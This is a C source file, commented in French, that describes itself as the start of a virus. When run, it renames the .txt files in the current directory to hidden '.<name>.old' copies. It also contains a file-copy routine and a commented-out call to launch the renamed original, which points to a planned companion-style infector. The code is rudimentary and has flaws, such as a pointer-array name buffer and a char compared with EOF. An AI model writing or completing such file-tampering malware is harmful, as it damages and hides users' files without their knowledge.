#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>

// permet de retourner l'extension d'un fichier
const char *get_filename_ext(const char *filename)
{
    const char *dot = strrchr(filename, '.');
    if (!dot || dot == filename)
        return "";
    return dot + 1;
}

// liste tout les fichiers présents dans le chemin spécifié
void getFiles(char *path)
{
    DIR *d;             // le dossier
    char *filename;     // une variable utilisée pour stocker le nom du fichier courant
    struct dirent *dir; // la structure qui représente le dossier

    d = opendir(path); // on ouvre le dossier

    // si ce dernier a ete correctement ouvert alors on continue
    if (d)
    {
        // pour chaque fichier présent dans le dossier
        while ((dir = readdir(d)) != NULL)
        {
            // on récupère le nom du fichier
            filename = dir->d_name;

            //TODO: on vérifie si ce dernier est un executable
            // pour le moment on se contente de modifier des fichier txt (mais pas le CMakeLists.txt)
            if (!strcmp(get_filename_ext(filename), "txt") && strcmp((char *)filename, (char *)"CMakeLists.txt"))
            {
                // on créé un nouveau nom pour le fichier qui sera sous la forme suivante: ".<FILENAME>.old"
                // on calcule la taille du nouveau nom
                char *str[strlen(filename) + 5];

                // on écrit notre nouveau nom dans une chaine de caractère qu'on utilise pour renommer notre fichier
                sprintf((char *)str, ".%s.old", filename);
                printf("%s\n", (char *)str);

                // on renome le fichier
                rename(filename, (char *)str);
            }
        }

        closedir(d);
    }
    // si le dossier n'as pas pu etre ouvert alors on quitte le programme
    else
    {
        printf("Error: cannot open directory: \n\t%s\n", path);
        exit(0);
    }
}

// permet de copier des fichiers entre eux (ne fonctionne pas avec les exe)
int copy_file(char *filename, char *dest_file)
{
    FILE *fptr1, *fptr2;
    char c;

    // Open one file for reading
    fptr1 = fopen(filename, "rb");
    if (fptr1 == NULL)
    {
        printf("Cannot open file %s \n", filename);
        exit(0);
    }

    // Open another file for writing
    fptr2 = fopen(dest_file, "wb");
    if (fptr2 == NULL)
    {
        printf("Cannot open file %s \n", dest_file);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr1);
    while (c != EOF)
    {
        fputc(c, fptr2);
        c = fgetc(fptr1);
    }

    printf("\nContents copied to %s", dest_file);

    fclose(fptr1);
    fclose(fptr2);
    return 0;
}

int main(int argc, char const *argv[])
{

    // on lance le programme .old en premier plan
    // system("./../build/Pi");

    // on lance notre code de virus
    // on récupère la liste des fichiers présents dans le dossier actuel

    getFiles(".");

    return 0;
}
